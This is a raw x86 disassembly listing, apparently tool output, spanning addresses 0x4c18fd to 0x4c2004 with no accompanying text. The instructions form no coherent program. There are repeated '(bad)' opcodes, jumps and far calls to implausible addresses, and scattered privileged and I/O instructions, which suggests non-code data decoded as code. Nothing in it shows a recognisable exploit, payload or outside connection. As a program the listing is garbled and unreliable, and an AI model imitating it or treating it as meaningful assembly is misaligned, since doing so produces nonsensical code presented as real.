  4c18fd:	cmp    DWORD PTR [ebp+0x7],0xa
  4c1901:	mov    dl,0xe0
  4c1903:	sbb    BYTE PTR [ebx+0x6d],bh
  4c1906:	addr16 repnz cwde 
  4c1909:	push   0x7afcb068
  4c190e:	cmc    
  4c190f:	add    BYTE PTR [eax-0x7e],bh
  4c1912:	cmp    BYTE PTR [ecx],dl
  4c1914:	popf   
  4c1915:	ror    al,0xc6
  4c1918:	sub    DWORD PTR [ecx-0x25a43d66],0x120de81
  4c1922:	clc    
  4c1923:	shl    bh,1
  4c1925:	rcr    BYTE PTR ds:0x4e5163c,1
  4c192b:	iret   
  4c192c:	stos   DWORD PTR es:[edi],eax
  4c192d:	cwde   
  4c192e:	add    eax,0x1fdc1aa7
  4c1933:	mov    WORD PTR [edx],?
  4c1935:	push   ds
  4c1936:	cmp    DWORD PTR [ebp-0x38],0x8b184851
  4c193d:	mov    eax,0x16317020
  4c1942:	jmp    0xd8bd207b
  4c1947:	dec    ebx
  4c1948:	xchg   ecx,eax
  4c1949:	cmp    al,0x85
  4c194b:	ss add ebp,ebx
  4c194e:	dec    esi
  4c194f:	dec    edx
  4c1950:	mov    ebx,edi
  4c1952:	iret   
  4c1953:	addr16 mov dl,dl
  4c1956:	sub    eax,0x5708e0df
  4c195b:	clc    
  4c195c:	rol    dl,1
  4c195e:	frstor [ecx]
  4c1960:	es jle 0x4c1993
  4c1963:	mov    ebx,0xaf30dd0a
  4c1968:	and    DWORD PTR [esi],ebx
  4c196a:	jae    0x4c19bb
  4c196c:	inc    esp
  4c196d:	fs es jo 0x4c19c0
  4c1971:	sbb    eax,0xe8c14640
  4c1976:	jo     0x4c19af
  4c1978:	dec    ebp
  4c1979:	js     0x4c18ff
  4c197b:	mov    ch,0x98
  4c197d:	mov    esp,0x9ba3f002
  4c1982:	sub    eax,0x5c4e4b46
  4c1987:	je     0x4c1918
  4c1989:	pop    es
  4c198a:	add    ebx,DWORD PTR [ebx-0x13bedac]
  4c1990:	add    ecx,DWORD PTR [ecx+0x69]
  4c1993:	jne    0x4c191d
  4c1995:	test   DWORD PTR [edi-0x358ff53],ebp
  4c199b:	mov    eax,0x8c042020
  4c19a0:	call   0xf617:0x191ed092
  4c19a7:	(bad)  
  4c19a9:	gs popa 
  4c19ab:	and    BYTE PTR [edi+eax*8+0x1b],cl
  4c19af:	sbb    edi,edi
  4c19b1:	in     al,0x5e
  4c19b3:	push   ebx
  4c19b4:	test   BYTE PTR [ebp+0x3bd682bf],dl
  4c19ba:	push   ebp
  4c19bb:	mov    ah,0x7c
  4c19bd:	push   esp
  4c19be:	mov    ebx,0xf1f667df
  4c19c3:	stc    
  4c19c4:	adc    cl,BYTE PTR [edi]
  4c19c6:	lea    esi,[eax+0x3be0555d]
  4c19cc:	mov    ecx,0x4d2825d3
  4c19d1:	mov    ah,0x9d
  4c19d3:	gs mov dl,0x6
  4c19d6:	fst    st(5)
  4c19d8:	ss inc edi
  4c19da:	out    dx,eax
  4c19db:	adc    BYTE PTR [eax],0xac
  4c19de:	or     dl,ah
  4c19e0:	or     al,0xbc
  4c19e2:	jle    0x4c1a46
  4c19e4:	inc    edi
  4c19e5:	xor    al,0xf4
  4c19e7:	inc    eax
  4c19e8:	arpl   di,sp
  4c19ea:	push   DWORD PTR [esi+0x45728374]
  4c19f0:	pop    ebp
  4c19f1:	cld    
  4c19f2:	push   ebx
  4c19f3:	xchg   edi,eax
  4c19f4:	pop    es
  4c19f5:	sbb    BYTE PTR [ebx-0x7e],0x87
  4c19f9:	push   esp
  4c19fa:	push   cs
  4c19fb:	xor    esi,DWORD PTR [ecx-0x28]
  4c19fe:	dec    edi
  4c19ff:	jnp    0x4c1a07
  4c1a01:	dec    edx
  4c1a02:	add    bl,BYTE PTR [ebp-0x40]
  4c1a05:	loopne 0x4c1a0e
  4c1a07:	jbe    0x4c1a53
  4c1a09:	jae    0x4c1a6e
  4c1a0b:	es push edx
  4c1a0d:	les    eax,FWORD PTR [ebp+0x4856c53a]
  4c1a13:	test   BYTE PTR [ebx],bh
  4c1a15:	cmp    BYTE PTR [ecx+0x76bca809],dl
  4c1a1b:	rcl    al,1
  4c1a1d:	fcmove st,st(5)
  4c1a1f:	rol    DWORD PTR [edi+ebx*1+0x23e9f837],cl
  4c1a26:	mov    esp,0x8515b109
  4c1a2b:	xor    DWORD PTR [esi+eax*2],eax
  4c1a2e:	cmp    BYTE PTR [ebp+0x2c],0x9c
  4c1a32:	hlt    
  4c1a33:	jmp    0x4c1a71
  4c1a35:	mov    DWORD PTR [edi],ebp
  4c1a37:	add    al,0xb1
  4c1a39:	stos   BYTE PTR es:[edi],al
  4c1a3a:	call   0x5874:0x43b0c05
  4c1a41:	and    ah,BYTE PTR [ebx+0x6a]
  4c1a44:	push   cs
  4c1a45:	xor    al,0xa
  4c1a47:	mov    edi,gs
  4c1a49:	inc    esp
  4c1a4a:	xor    DWORD PTR [eax-0x48],eax
  4c1a4d:	mov    ecx,0x1f40495c
  4c1a52:	push   0x5b65c12
  4c1a57:	dec    eax
  4c1a58:	aad    0xc
  4c1a5a:	sti    
  4c1a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c1a5c:	or     al,0x42
  4c1a5e:	jmp    0x4c1a61
  4c1a60:	dec    edx
  4c1a61:	inc    esi
  4c1a62:	jle    0x4c1ab4
  4c1a64:	adc    edi,ebp
  4c1a66:	popf   
  4c1a67:	ins    DWORD PTR es:[edi],dx
  4c1a68:	stc    
  4c1a69:	mov    edi,0x1d570b0
  4c1a6e:	test   eax,0x2f70f893
  4c1a73:	test   eax,0x3df42875
  4c1a78:	pop    ss
  4c1a79:	sub    ch,ch
  4c1a7b:	out    dx,al
  4c1a7c:	mov    dh,BYTE PTR [eax]
  4c1a7e:	sbb    ecx,DWORD PTR [ebx]
  4c1a80:	xor    DWORD PTR [ecx+0x48b019cc],edx
  4c1a86:	or     eax,ebp
  4c1a88:	mov    al,ds:0x9fe733b
  4c1a8d:	aam    0x6f
  4c1a8f:	add    eax,0x48da210
  4c1a94:	mov    al,0x8
  4c1a96:	push   esi
  4c1a97:	xor    edx,DWORD PTR [edx]
  4c1a99:	add    DWORD PTR [eax],edi
  4c1a9b:	mov    al,0x38
  4c1a9d:	fst    DWORD PTR [esi+0x1b]
  4c1aa0:	repnz or al,0x9c
  4c1aa3:	jb     0x4c1b0e
  4c1aa5:	jecxz  0x4c1aca
  4c1aa7:	leave  
  4c1aa8:	or     BYTE PTR [eax-0x350fcd75],dh
  4c1aae:	xor    dh,al
  4c1ab0:	xor    eax,0x97af570f
  4c1ab5:	lock addr16 pop ecx
  4c1ab8:	cmp    ecx,DWORD PTR [esi+0x74]
  4c1abb:	xor    eax,0x4f0a2f81
  4c1ac0:	movmskps ecx,xmm7
  4c1ac3:	iret   
  4c1ac4:	je     0x4c1ae5
  4c1ac6:	dec    eax
  4c1ac7:	je     0x4c1ae2
  4c1ac9:	inc    eax
  4c1aca:	js     0x4c1b17
  4c1acc:	lea    ecx,[eax+0x6c]
  4c1acf:	int3   
  4c1ad0:	je     0x4c1b06
  4c1ad2:	aad    0x2e
  4c1ad4:	nop
  4c1ad5:	(bad)  
  4c1ad6:	jnp    0x4c1b18
  4c1ad8:	lds    edx,FWORD PTR [edx]
  4c1ada:	or     eax,0x70a7ccd0
  4c1adf:	ins    BYTE PTR es:[edi],dx
  4c1ae0:	xchg   BYTE PTR [ebx],dl
  4c1ae2:	add    DWORD PTR [edx+0x9d290cc],ecx
  4c1ae8:	and    BYTE PTR [eax],al
  4c1aea:	and    cl,BYTE PTR [eax+ebp*1]
  4c1aed:	js     0x4c1b1b
  4c1aef:	sbb    al,BYTE PTR [ebx+0x3c]
  4c1af2:	test   bh,dl
  4c1af4:	xchg   BYTE PTR [esi+0x2f],al
  4c1af7:	dec    ebp
  4c1af8:	in     al,dx
  4c1af9:	leave  
  4c1afa:	jle    0x4c1add
  4c1afc:	xor    al,al
  4c1afe:	push   ss
  4c1aff:	sbb    eax,0xf301bd98
  4c1b04:	stos   DWORD PTR es:[edi],eax
  4c1b05:	add    eax,esp
  4c1b07:	dec    eax
  4c1b08:	test   eax,0xf4019a7a
  4c1b0d:	cwde   
  4c1b0e:	test   eax,0x51a43783
  4c1b13:	icebp  
  4c1b14:	xor    ch,bh
  4c1b16:	push   cs
  4c1b17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c1b18:	mov    cl,0xa2
  4c1b1a:	or     ebx,esi
  4c1b1c:	imul   ebp,DWORD PTR [esi],0x80d90a39
  4c1b22:	mov    al,0xb0
  4c1b24:	repnz loopne 0x4c1aa8
  4c1b27:	push   edx
  4c1b28:	pushf  
  4c1b29:	dec    edi
  4c1b2a:	mov    gs:0xcb92e14c,eax
  4c1b30:	in     eax,0x46
  4c1b32:	cmp    esi,DWORD PTR ds:0x480ee141
  4c1b38:	repz daa 
  4c1b3a:	sub    ebx,DWORD PTR [esp+esi*2+0x7f07201a]
  4c1b41:	aam    0x23
  4c1b43:	add    eax,0x74f575b1
  4c1b48:	call   eax
  4c1b4a:	add    esp,DWORD PTR [edi]
  4c1b4c:	clc    
  4c1b4d:	or     DWORD PTR [eax-0x4c],0x4004b0c7
  4c1b54:	lds    esi,FWORD PTR [edx-0x77]
  4c1b57:	retf   0xc8c0
  4c1b5a:	sbb    BYTE PTR [ecx],bl
  4c1b5c:	jno    0xbd692b8c
  4c1b62:	and    eax,0x293d0118
  4c1b67:	div    ecx
  4c1b69:	adc    al,0x84
  4c1b6b:	and    edi,DWORD PTR [edx]
  4c1b6d:	dec    ecx
  4c1b6e:	stc    
  4c1b6f:	inc    esi
  4c1b70:	sub    cl,BYTE PTR [eax+0x30]
  4c1b73:	lahf   
  4c1b74:	dec    ecx
  4c1b75:	add    edx,DWORD PTR [ebx]
  4c1b77:	cmc    
  4c1b78:	(bad)  
  4c1b79:	cli    
  4c1b7a:	ror    BYTE PTR [ebx+ebx*4],0x17
  4c1b7e:	aad    0xae
  4c1b80:	mov    dl,0x84
  4c1b82:	inc    esi
  4c1b83:	jge    0x4c1bc5
  4c1b85:	push   0x17
  4c1b87:	jne    0x4c1ba5
  4c1b89:	dec    ebx
  4c1b8a:	add    ebx,DWORD PTR [edx]
  4c1b8c:	sbb    DWORD PTR [eax+0xb],edi
  4c1b8f:	xor    eax,0x5d3a8c79
  4c1b94:	mov    BYTE PTR [esi+0x53],dh
  4c1b97:	scas   eax,DWORD PTR es:[edi]
  4c1b98:	pop    es
  4c1b99:	xchg   BYTE PTR [edx-0x4dca64cd],dh
  4c1b9f:	jnp    0x4c1bc7
  4c1ba1:	lahf   
  4c1ba2:	add    eax,DWORD PTR [edi]
  4c1ba4:	fwait
  4c1ba5:	cld    
  4c1ba6:	imul   edi,DWORD PTR [ebx+0x40],0x503dd9ae
  4c1bad:	push   esi
  4c1bae:	sbb    al,0x51
  4c1bb0:	jle    0x4c1bff
  4c1bb2:	pushf  
  4c1bb3:	cdq    
  4c1bb4:	hlt    
  4c1bb5:	jge    0x4c1c07
  4c1bb7:	ins    BYTE PTR es:[edi],dx
  4c1bb8:	dec    ebx
  4c1bb9:	push   0xfb6f6b82
  4c1bbe:	imul   eax,DWORD PTR [ecx-0x1482b498],0x5c
  4c1bc5:	inc    ebp
  4c1bc6:	sub    eax,0x3b97514a
  4c1bcb:	and    BYTE PTR [esi+0x45447c0d],0xb0
  4c1bd2:	cmpxchg DWORD PTR [ebx-0x55],ebp
  4c1bd6:	push   eax
  4c1bd7:	xor    ebp,esp
  4c1bd9:	xor    ah,BYTE PTR [ecx-0x4da6d992]
  4c1bdf:	mov    ch,0x2
  4c1be1:	mov    ah,0x7f
  4c1be3:	ss push ss
  4c1be5:	fcmovnu st,st(3)
  4c1be7:	cmp    BYTE PTR [eax],ah
  4c1be9:	fst    QWORD PTR [esi]
  4c1beb:	fwait
  4c1bec:	jne    0x4c1bce
  4c1bee:	test   BYTE PTR [edx],dh
  4c1bf0:	and    DWORD PTR [ebx-0x3],edx
  4c1bf3:	mov    eax,0xc0829ea0
  4c1bf8:	and    DWORD PTR [ebx+0x6700250],ebp
  4c1bfe:	push   esp
  4c1bff:	cmp    BYTE PTR [ecx],0x11
  4c1c02:	jo     0x4c1ba8
  4c1c04:	add    DWORD PTR [esi+eax*8],ecx
  4c1c07:	sub    eax,DWORD PTR ds:0x9b4c3974
  4c1c0d:	xor    ecx,ecx
  4c1c0f:	ret    
  4c1c10:	sbb    BYTE PTR [ecx-0x32a6d38b],ch
  4c1c16:	pop    edx
  4c1c17:	sbb    edi,DWORD PTR [eax-0x1e0a0b0f]
  4c1c1d:	adc    ah,BYTE PTR [eax]
  4c1c1f:	or     al,ah
  4c1c21:	add    al,0xbc
  4c1c23:	push   es
  4c1c24:	cmp    dl,BYTE PTR [ebx]
  4c1c26:	adc    ch,dl
  4c1c28:	and    eax,0x4ae21800
  4c1c2d:	mov    ah,0x20
  4c1c2f:	dec    edi
  4c1c30:	sub    al,0x4
  4c1c32:	scas   eax,DWORD PTR es:[edi]
  4c1c33:	xor    BYTE PTR [edi],cl
  4c1c35:	loope  0x4c1c68
  4c1c37:	adc    ecx,esp
  4c1c39:	popf   
  4c1c3a:	sub    BYTE PTR [esi],dh
  4c1c3c:	popa   
  4c1c3d:	mov    ecx,0xe939857d
  4c1c42:	sub    eax,0x17717aa7
  4c1c47:	mov    al,0x3f
  4c1c49:	rol    BYTE PTR [eax+0x39407aa3],1
  4c1c4f:	mov    esp,0x369c2291
  4c1c54:	cli    
  4c1c55:	fild   DWORD PTR [edx+edx*2]
  4c1c58:	fmul   DWORD PTR [ebx-0x7f]
  4c1c5b:	test   eax,0xe25d0ed5
  4c1c60:	ret    
  4c1c61:	sti    
  4c1c62:	loopne 0x4c1c77
  4c1c64:	retf   0xb444
  4c1c67:	push   ecx
  4c1c68:	mov    esp,0xdc18f81d
  4c1c6d:	inc    esi
  4c1c6e:	outs   dx,BYTE PTR ds:[esi]
  4c1c6f:	je     0x4c1c14
  4c1c71:	arpl   WORD PTR [ecx-0x3486fde4],ax
  4c1c77:	add    BYTE PTR [esi-0x78db8dfe],dh
  4c1c7d:	in     al,0xb5
  4c1c7f:	add    ch,BYTE PTR [ebp+0x7030b802]
  4c1c85:	and    eax,DWORD PTR [ebx-0x3c]
  4c1c88:	mov    es,WORD PTR [ecx-0x6f196ac4]
  4c1c8e:	sbb    edi,esp
  4c1c90:	cld    
  4c1c91:	cld    
  4c1c92:	mov    eax,0xe79bcff4
  4c1c97:	and    BYTE PTR [edi+0x2],ch
  4c1c9a:	cld    
  4c1c9b:	cld    
  4c1c9c:	cmp    eax,DWORD PTR [ebp-0x3c]
  4c1c9f:	hlt    
  4c1ca0:	mov    dl,0x21
  4c1ca2:	jns    0x4c1cc4
  4c1ca4:	pop    ecx
  4c1ca5:	add    bl,BYTE PTR [eax-0x3d]
  4c1ca8:	pop    es
  4c1ca9:	cwde   
  4c1caa:	sub    eax,DWORD PTR [ebx]
  4c1cac:	fimul  WORD PTR fs:[ebx+0x18a04523]
  4c1cb3:	(bad)  
  4c1cb4:	jbe    0x4c1cbe
  4c1cb6:	push   edx
  4c1cb7:	sub    cl,BYTE PTR [edi]
  4c1cb9:	xlat   BYTE PTR ds:[ebx]
  4c1cba:	mov    bl,0xc7
  4c1cbc:	push   ecx
  4c1cbd:	test   BYTE PTR [edx+0x2],al
  4c1cc0:	cld    
  4c1cc1:	jmp    0xc85:0xc8465c9e
  4c1cc8:	mov    al,0x5e
  4c1cca:	xor    cl,BYTE PTR [ebx+0x3a]
  4c1ccd:	cmp    cl,BYTE PTR [eax]
  4c1ccf:	or     BYTE PTR [edx],cl
  4c1cd1:	sub    al,0xc0
  4c1cd3:	mov    edi,0xc0360556
  4c1cd8:	nop
  4c1cd9:	or     DWORD PTR [eax],ebx
  4c1cdb:	mov    esi,DWORD PTR [ecx]
  4c1cdd:	scas   eax,DWORD PTR es:[edi]
  4c1cde:	xchg   ebp,eax
  4c1cdf:	popf   
  4c1ce0:	imul   ebp,DWORD PTR [ebx],0x4
  4c1ce3:	jl     0x4c1cc1
  4c1ce5:	lea    eax,[ecx+0x2e]
  4c1ce8:	xchg   edi,eax
  4c1ce9:	retf   
  4c1cea:	xor    BYTE PTR [edx],ch
  4c1cec:	sbb    dl,BYTE PTR [esp+ebp*2]
  4c1cef:	push   eax
  4c1cf0:	mov    edi,0xe128fc9a
  4c1cf5:	and    bh,bl
  4c1cf7:	or     eax,0x5affc813
  4c1cfc:	or     bh,bh
  4c1cfe:	or     bh,dl
  4c1d00:	inc    ecx
  4c1d01:	pop    es
  4c1d02:	cmp    al,0x19
  4c1d04:	and    eax,esi
  4c1d06:	adc    DWORD PTR [edx+0x3c],ebx
  4c1d09:	mov    al,ds:0xc4874d01
  4c1d0e:	sbb    BYTE PTR ds:0x94e5b812,cl
  4c1d14:	cmp    al,0x87
  4c1d16:	hlt    
  4c1d17:	mov    eax,0x90bc01f9
  4c1d1c:	xchg   DWORD PTR [eax-0x7],esp
  4c1d1f:	xor    bh,BYTE PTR [ecx+0x73017c85]
  4c1d25:	jno    0x4c1d87
  4c1d27:	dec    eax
  4c1d28:	rcl    DWORD PTR [eax],0xb1
  4c1d2b:	int3   
  4c1d2c:	stos   BYTE PTR es:[edi],al
  4c1d2d:	int3   
  4c1d2e:	in     eax,0x72
  4c1d30:	jns    0x4c1d22
  4c1d32:	and    DWORD PTR [esi+0x75],edx
  4c1d35:	inc    eax
  4c1d36:	cmp    ch,BYTE PTR [edi]
  4c1d38:	or     DWORD PTR [ecx+0x70],edi
  4c1d3b:	leave  
  4c1d3c:	sub    DWORD PTR [edx],esi
  4c1d3e:	stc    
  4c1d3f:	pop    ds
  4c1d40:	dec    edx
  4c1d41:	add    DWORD PTR [ebx+ecx*8],eax
  4c1d44:	and    al,BYTE PTR [ecx]
  4c1d46:	mov    ch,dl
  4c1d48:	cld    
  4c1d49:	add    esp,ebp
  4c1d4b:	or     ch,0xfc
  4c1d4e:	add    DWORD PTR [esi+eax*2],0xffffff89
  4c1d52:	cwde   
  4c1d53:	xor    ah,ch
  4c1d55:	mov    ecx,0x8b1e011c
  4c1d5a:	into   
  4c1d5b:	jmp    0x39781161
  4c1d60:	and    ch,BYTE PTR fs:[eax]
  4c1d63:	fisttp DWORD PTR [esi]
  4c1d65:	and    DWORD PTR [ebx],ecx
  4c1d67:	jo     0x4c1dcd
  4c1d69:	out    dx,al
  4c1d6a:	(bad)  
  4c1d6b:	cld    
  4c1d6c:	cli    
  4c1d6d:	imul   esp,DWORD PTR [ecx],0xffffffc0
  4c1d70:	pop    ebx
  4c1d71:	add    DWORD PTR [edi+0x1d],ecx
  4c1d74:	mov    eax,ds:0xc81b4c97
  4c1d79:	cli    
  4c1d7a:	addr16 push ecx
  4c1d7c:	jle    0x4c1dfb
  4c1d7e:	and    BYTE PTR [ebx-0x80],bl
  4c1d81:	and    eax,0x3977395b
  4c1d86:	add    bh,BYTE PTR [esi+ebx*2]
  4c1d89:	mov    dl,0x4f
  4c1d8b:	cmp    BYTE PTR [ebp+0x65],0x80
  4c1d8f:	mov    DWORD PTR [ecx+0x71eb7cf6],0xeb13c026
  4c1d99:	bound  eax,QWORD PTR [ebp+0x7d4335a0]
  4c1d9f:	jle    0x4c1dfb
  4c1da1:	enter  0x41c0,0x11
  4c1da5:	lock sbb al,0xc0
  4c1da8:	cmp    edi,eax
  4c1daa:	inc    edi
  4c1dab:	push   ecx
  4c1dac:	call   0xf1bb5dbc
  4c1db1:	ds mov edx,eax
  4c1db4:	outs   dx,DWORD PTR ds:[esi]
  4c1db5:	ins    DWORD PTR es:[edi],dx
  4c1db6:	test   DWORD PTR [ebp-0x44],0xa8660003
  4c1dbd:	inc    eax
  4c1dbe:	sbb    BYTE PTR ds:0x90300bae,ch
  4c1dc4:	mov    ds:0x9cc5a4e5,eax
  4c1dc9:	pop    es
  4c1dca:	sbb    BYTE PTR [ebp-0x1d],bl
  4c1dcd:	fwait
  4c1dce:	fs push es
  4c1dd0:	cmp    BYTE PTR [edi],dl
  4c1dd2:	and    DWORD PTR [edi+0x4ea4c28a],edx
  4c1dd8:	sbb    BYTE PTR [ebx+0x24],0x82
  4c1ddc:	or     esp,DWORD PTR [ecx]
  4c1dde:	add    dh,BYTE PTR [esi]
  4c1de0:	shl    BYTE PTR [ecx+eax*1],0xb9
  4c1de4:	add    DWORD PTR [edi],esi
  4c1de6:	cld    
  4c1de7:	cs add al,0x86
  4c1dea:	add    bl,dl
  4c1dec:	rcl    al,1
  4c1dee:	mov    esi,DWORD PTR [ebx+0x41]
  4c1df1:	cmp    al,0x80
  4c1df3:	add    ebx,ecx
  4c1df5:	mov    ebp,0x1b0f786
  4c1dfa:	cmp    dh,dh
  4c1dfc:	xor    ebx,esp
  4c1dfe:	mov    BYTE PTR [ebp-0x60],cl
  4c1e01:	(bad)  
  4c1e02:	xchg   edi,eax
  4c1e03:	mov    esi,edi
  4c1e05:	jne    0x4c1d9b
  4c1e07:	mov    bl,0xb4
  4c1e09:	pop    edx
  4c1e0a:	pand   mm0,QWORD PTR [edx-0x48]
  4c1e0e:	call   0x83750631
  4c1e13:	pop    ebp
  4c1e14:	rcl    BYTE PTR [esi],0xd2
  4c1e17:	jne    0x4c1e4c
  4c1e19:	lods   eax,DWORD PTR ds:[esi]
  4c1e1a:	cmp    al,0x25
  4c1e1c:	ins    BYTE PTR es:[edi],dx
  4c1e1d:	cmp    eax,esi
  4c1e1f:	jmp    0x4c1e29
  4c1e21:	add    DWORD PTR [edx+0x60],ecx
  4c1e24:	mov    esp,0x520a0697
  4c1e29:	out    dx,al
  4c1e2a:	sahf   
  4c1e2b:	and    ebp,ebx
  4c1e2d:	pop    eax
  4c1e2e:	ds in  eax,dx
  4c1e30:	push   0x20
  4c1e32:	push   edx
  4c1e33:	cmc    
  4c1e34:	mov    ebx,0xc4e4b8bf
  4c1e39:	lea    ebp,[edi]
  4c1e3b:	mov    ah,0x4
  4c1e3d:	mov    eax,0xdccb9600
  4c1e42:	daa    
  4c1e43:	fdivr  st(0),st
  4c1e45:	and    DWORD PTR [eax],eax
  4c1e47:	pop    esi
  4c1e48:	pop    edx
  4c1e49:	psrld  mm2,QWORD PTR ds:0xc06ac100
  4c1e50:	cwde   
  4c1e51:	add    al,0x29
  4c1e53:	int3   
  4c1e54:	add    BYTE PTR [ebp+0x4523c388],0xdc
  4c1e5b:	retf   
  4c1e5c:	push   edx
  4c1e5d:	das    
  4c1e5e:	imul   esp,DWORD PTR [ebp+0x23],0x69
  4c1e62:	fiadd  WORD PTR [edi]
  4c1e64:	(bad)  
  4c1e66:	and    BYTE PTR [eax],al
  4c1e68:	pop    ds
  4c1e69:	push   eax
  4c1e6a:	or     esi,esi
  4c1e6c:	dec    ecx
  4c1e6d:	jge    0x4c1e3f
  4c1e6f:	mov    eax,0x547b2756
  4c1e74:	neg    DWORD PTR [edx-0x38]
  4c1e77:	lock popa 
  4c1e79:	add    ebx,edi
  4c1e7b:	add    dl,BYTE PTR [ebx]
  4c1e7d:	lods   al,BYTE PTR ds:[esi]
  4c1e7e:	mov    ecx,0x8128a748
  4c1e83:	xchg   ecx,eax
  4c1e84:	outs   dx,BYTE PTR ds:[esi]
  4c1e85:	or     al,0xf1
  4c1e87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c1e88:	push   edx
  4c1e89:	jbe    0x4c1ef0
  4c1e8b:	dec    esp
  4c1e8c:	and    al,0x78
  4c1e8e:	dec    ebp
  4c1e8f:	add    bl,BYTE PTR [ebx+0x5d]
  4c1e92:	add    al,0x1d
  4c1e94:	loopne 0x4c1e24
  4c1e96:	stos   DWORD PTR es:[edi],eax
  4c1e97:	mov    bh,0xe3
  4c1e99:	push   eax
  4c1e9a:	shl    DWORD PTR [esp+ebp*1-0x7f],0x72
  4c1e9f:	jnp    0x4c1ef6
  4c1ea1:	add    eax,0x305d014f
  4c1ea6:	jo     0x4c1ef3
  4c1ea8:	pop    es
  4c1ea9:	pop    edi
  4c1eaa:	push   eax
  4c1eab:	enter  0x2cff,0xdc
  4c1eaf:	dec    edx
  4c1eb0:	xor    edx,DWORD PTR ds:0xdad4a418
  4c1eb6:	adc    al,0x4
  4c1eb8:	lock arpl WORD PTR [eax],ax
  4c1ebb:	pushf  
  4c1ebc:	out    0x76,al
  4c1ebe:	dec    esp
  4c1ebf:	sti    
  4c1ec0:	mov    ds:0x5a8d8ed,al
  4c1ec5:	add    cl,0x49
  4c1ec8:	or     eax,0xe86a49c2
  4c1ecd:	push   ebp
  4c1ece:	pop    edx
  4c1ecf:	gs pop esp
  4c1ed1:	mul    al
  4c1ed3:	aaa    
  4c1ed4:	loope  0x4c1f0c
  4c1ed6:	ins    DWORD PTR es:[edi],dx
  4c1ed7:	pop    ebx
  4c1ed8:	sub    ebx,DWORD PTR [ecx+0x488fe71]
  4c1ede:	push   eax
  4c1edf:	loopne 0x4c1f21
  4c1ee1:	pusha  
  4c1ee2:	jno    0x4c1ec9
  4c1ee4:	add    esi,DWORD PTR [ebx+0x7751ac0a]
  4c1eea:	in     al,0x1e
  4c1eec:	xchg   ecx,eax
  4c1eed:	mov    dl,0x81
  4c1eef:	stos   DWORD PTR es:[edi],eax
  4c1ef0:	mov    esi,0xfbfedca4
  4c1ef5:	add    BYTE PTR [edi+0x1b4403d3],cl
  4c1efb:	mov    al,0x41
  4c1efd:	lds    ecx,FWORD PTR [eax-0x1e]
  4c1f00:	out    dx,eax
  4c1f01:	(bad)  
  4c1f03:	(bad)  
  4c1f04:	mov    al,ds:0x5c435a07
  4c1f09:	cli    
  4c1f0a:	pop    ebp
  4c1f0b:	test   al,0x74
  4c1f0d:	xchg   BYTE PTR [eax+0x70],bh
  4c1f10:	popf   
  4c1f11:	sub    cl,dl
  4c1f13:	mov    ah,0x93
  4c1f15:	or     DWORD PTR [eax],edi
  4c1f17:	nop
  4c1f18:	or     ch,0xad
  4c1f1b:	in     eax,0xa4
  4c1f1d:	mov    dl,0x19
  4c1f1f:	xlat   BYTE PTR ds:[ebx]
  4c1f20:	cmc    
  4c1f21:	mov    ah,0x8d
  4c1f23:	mov    al,ds:0x27a401f0
  4c1f28:	sbb    DWORD PTR [ecx-0x7124833d],edx
  4c1f2e:	mov    esp,0xfc049c0a
  4c1f33:	iret   
  4c1f34:	ja     0x4c1f39
  4c1f36:	sbb    eax,0x5f36b0e4
  4c1f3b:	sub    BYTE PTR [eax+0x35],0x3e
  4c1f3f:	xchg   DWORD PTR [ebp-0x37],ebp
  4c1f42:	jle    0x4c1f4b
  4c1f44:	push   edx
  4c1f45:	push   esi
  4c1f46:	test   eax,0x83163331
  4c1f4b:	ret    
  4c1f4c:	cmc    
  4c1f4d:	inc    eax
  4c1f4e:	add    BYTE PTR [edx],bl
  4c1f50:	imul   ebp,DWORD PTR [edx-0x29],0xffffff89
  4c1f54:	ins    DWORD PTR es:[edi],dx
  4c1f55:	and    BYTE PTR [edi+0x199e71c1],0x57
  4c1f5c:	sub    al,dh
  4c1f5e:	xchg   ebx,eax
  4c1f5f:	mov    al,BYTE PTR [edi]
  4c1f61:	inc    esi
  4c1f62:	pop    es
  4c1f63:	bound  eax,QWORD PTR [esi-0x50]
  4c1f66:	mov    al,ds:0x7911738
  4c1f6b:	add    BYTE PTR [eax],cl
  4c1f6d:	lods   eax,DWORD PTR ds:[esi]
  4c1f6e:	inc    ebp
  4c1f6f:	pushf  
  4c1f70:	std    
  4c1f71:	hlt    
  4c1f72:	push   es
  4c1f73:	add    edi,ecx
  4c1f75:	cmp    BYTE PTR [ecx-0x66feffc6],0x66
  4c1f7c:	mov    esp,0x88b0bbbc
  4c1f81:	aam    0xa6
  4c1f83:	fs pushf 
  4c1f85:	xchg   ebp,eax
  4c1f86:	sub    al,0x9f
  4c1f88:	jno    0x4c1f1c
  4c1f8a:	jo     0x4c1f47
  4c1f8c:	lods   al,BYTE PTR ds:[esi]
  4c1f8d:	xor    bl,ah
  4c1f8f:	add    DWORD PTR [edx-0x26],esp
  4c1f92:	xchg   esp,eax
  4c1f93:	mov    eax,0x900064bb
  4c1f98:	retf   0xacb8
  4c1f9b:	mov    al,0x4c
  4c1f9d:	es cdq 
  4c1f9f:	in     al,0xb0
  4c1fa1:	test   al,0xa0
  4c1fa3:	lds    esp,FWORD PTR [esi+eax*8+0x5630b018]
  4c1faa:	mov    al,ds:0x9c66997f
  4c1faf:	(bad)  
  4c1fb0:	mov    ebx,0x8bb8ff77
  4c1fb5:	dec    ebp
  4c1fb6:	lock jle 0x4c1fc6
  4c1fb9:	bound  edx,QWORD PTR [eax+0x38072051]
  4c1fbf:	cmp    bh,0x54
  4c1fc2:	call   0xacb4:0xb4f70801
  4c1fc9:	cmp    DWORD PTR [ecx],esp
  4c1fcb:	or     DWORD PTR [eax+eiz*4-0x6efe2854],0xc
  4c1fd3:	add    DWORD PTR [edx-0x60],edx
  4c1fd6:	mov    ah,0xcc
  4c1fd8:	xor    DWORD PTR [ebx-0x2d],esp
  4c1fdb:	or     BYTE PTR [edi],cl
  4c1fdd:	cmc    
  4c1fde:	ja     0x4c1fa7
  4c1fe0:	mov    cs,WORD PTR [edi]
  4c1fe2:	sub    eax,0x520331fa
  4c1fe7:	dec    esp
  4c1fe8:	test   BYTE PTR [edx],al
  4c1fea:	mov    ds:0xb4a56a5,eax
  4c1fef:	je     0x4c1fa8
  4c1ff1:	or     BYTE PTR [ebp-0x7d],dh
  4c1ff4:	push   esp
  4c1ff5:	adc    dl,BYTE PTR [ecx+0x9f00264]
  4c1ffb:	adc    edi,DWORD PTR ds:0x12a1c034
  4c2001:	xor    edi,DWORD PTR [edi+0x51]
  4c2004:	int    0x3d
